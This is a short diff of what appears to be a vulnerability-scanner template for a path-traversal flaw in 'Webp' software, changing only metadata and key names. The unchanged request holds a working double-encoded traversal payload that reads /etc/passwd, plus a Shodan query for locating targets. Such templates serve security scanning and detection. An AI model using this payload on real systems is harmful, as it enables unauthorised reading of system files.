@@ -12,12 +12,11 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   metadata:
-    max-request: 1
     verified: true
     shodan-query: http.html:"Webp"
   tags: lfi,webp
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
